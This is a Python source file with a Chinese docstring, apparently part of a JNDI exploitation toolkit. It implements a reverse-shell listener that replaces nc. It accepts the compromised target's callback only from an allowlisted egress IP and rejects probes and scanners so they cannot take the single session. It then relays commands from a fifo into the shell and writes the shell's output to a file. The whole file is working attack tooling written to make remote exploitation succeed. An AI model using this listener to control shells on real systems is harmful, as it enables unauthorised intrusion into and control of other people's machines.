"""JNDI 反弹 shell 监听器 —— 纯标准库，替代 nc。

为什么不用 nc：
- nc -l 只服务一个连接，接受后即退出。工具自身的公网连通性探测、
  云厂商安全组探测或端口扫描器一旦先连上，就会“抢走”唯一的 shell
  会话槽位，nc 退出后靶机的真实回连被 RST，整个利用静默失败。
- nc 各发行版（openbsd / traditional）参数互不兼容。

本监听器：
- 可带白名单（靶机出口 IP）。白名单外的连接一律记录后拒绝并继续
  监听，不消耗会话槽位；白名单内（或未指定白名单）的连接被接受。
- 命令仍经 fifo 注入：将 fifo -> socket、socket -> 输出文件双向桥接。
- 日志写 stderr（由启动命令重定向到 rev.out）。

用法: reverse_listener.py HOST PORT FIFO OUT [ALLOW_IP ...]
"""
import socket
import sys
import threading


def log(msg: str) -> None:
    sys.stderr.write(msg + "\n")
    sys.stderr.flush()


def main() -> None:
    host, port = sys.argv[1], int(sys.argv[2])
    fifo_path, out_path = sys.argv[3], sys.argv[4]
    allow = set(sys.argv[5:])

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((host, port))
    srv.listen(4)
    log(f"Listening on {host} {port}")

    while True:
        conn, addr = srv.accept()
        peer_ip = addr[0]
        if allow and peer_ip not in allow:
            log(f"Rejected connection from {peer_ip}:{addr[1]} (not in allowlist)")
            conn.close()
            continue
        log(f"Accepted connection from {peer_ip}:{addr[1]}")
        break

    with open(out_path, "ab", buffering=0) as out, open(fifo_path, "rb", buffering=0) as fifo:
        stop = threading.Event()

        def fifo_to_sock() -> None:
            try:
                while not stop.is_set():
                    data = fifo.read(4096)
                    if not data:
                        break
                    conn.sendall(data)
            except OSError:
                pass
            finally:
                try:
                    conn.shutdown(socket.SHUT_WR)
                except OSError:
                    pass

        def sock_to_out() -> None:
            try:
                while True:
                    data = conn.recv(4096)
                    if not data:
                        break
                    out.write(data)
            except OSError:
                pass
            finally:
                stop.set()

        t1 = threading.Thread(target=fifo_to_sock, daemon=True)
        t2 = threading.Thread(target=sock_to_out, daemon=True)
        t1.start()
        t2.start()
        t2.join()
    log("Connection closed")


if __name__ == "__main__":
    main()
